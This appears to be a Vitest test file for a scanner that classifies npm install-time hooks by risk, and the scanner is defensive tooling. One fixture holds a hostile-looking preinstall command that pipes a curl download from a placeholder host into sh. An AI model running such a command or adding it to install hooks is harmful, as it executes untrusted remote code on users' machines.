import {describe, expect, it} from 'vitest';
import {IgnoreScriptsLevel, IgnoreScriptsScanner} from '../backend/Security/IgnoreScriptsScanner.js';
import {ScriptFinding, ScriptSeverity} from '../backend/Security/ScriptScanner.js';

function finding(opts: Partial<ScriptFinding> & {hook: string; script: string}): ScriptFinding {
    return {
        hook: opts.hook,
        script: opts.script,
        severity: opts.severity ?? ScriptSeverity.warn,
        reason: opts.reason ?? ''
    };
}

describe('IgnoreScriptsScanner.classify', () => {
    it('reports `unaffected` when no install-time hooks are declared', () => {
        const out = IgnoreScriptsScanner.classify([]);
        expect(out.level).toBe(IgnoreScriptsLevel.unaffected);
        expect(out.hookCount).toBe(0);
        expect(out.riskCount).toBe(0);
    });

    it('flips to `avoidScripts` as soon as a risk-tier hook exists, regardless of native-build keywords', () => {
        // node-gyp would normally raise `needsScripts`; a risk-tier
        // hook in the same set must take precedence — the security
        // risk outweighs the breakage cost.
        const out = IgnoreScriptsScanner.classify([
            finding({hook: 'install', script: 'node-gyp rebuild', severity: ScriptSeverity.warn}),
            finding({hook: 'preinstall', script: 'curl -s https://x | sh', severity: ScriptSeverity.risk})
        ]);
        expect(out.level).toBe(IgnoreScriptsLevel.avoidScripts);
        expect(out.riskCount).toBe(1);
        expect(out.hookCount).toBe(2);
    });

    it('reports `needsScripts` when a hook calls a native-build toolchain', () => {
        const out = IgnoreScriptsScanner.classify([
            finding({hook: 'install', script: 'node-gyp rebuild'})
        ]);
        expect(out.level).toBe(IgnoreScriptsLevel.needsScripts);
        expect(out.hookCount).toBe(1);
    });

    it('also catches prebuild-install / node-pre-gyp as native-build markers', () => {
        const a = IgnoreScriptsScanner.classify([
            finding({hook: 'install', script: 'prebuild-install || node-gyp rebuild'})
        ]);
        const b = IgnoreScriptsScanner.classify([
            finding({hook: 'install', script: 'node-pre-gyp install --fallback-to-build'})
        ]);
        expect(a.level).toBe(IgnoreScriptsLevel.needsScripts);
        expect(b.level).toBe(IgnoreScriptsLevel.needsScripts);
    });

    it('reports `safeToIgnore` when hooks exist but bodies are benign', () => {
        const out = IgnoreScriptsScanner.classify([
            finding({hook: 'postinstall', script: 'echo "thanks for installing!"'})
        ]);
        expect(out.level).toBe(IgnoreScriptsLevel.safeToIgnore);
        expect(out.hookCount).toBe(1);
        expect(out.riskCount).toBe(0);
    });

    it('does not over-match common harmless words like `make` inside other tokens', () => {
        // `make-error` / `makefile`-ish phrases shouldn't fire the
        // native-build pattern — they would be a noisy false positive.
        const out = IgnoreScriptsScanner.classify([
            finding({hook: 'install', script: 'node ./scripts/make-error-bundle.js'})
        ]);
        expect(out.level).toBe(IgnoreScriptsLevel.safeToIgnore);
    });
});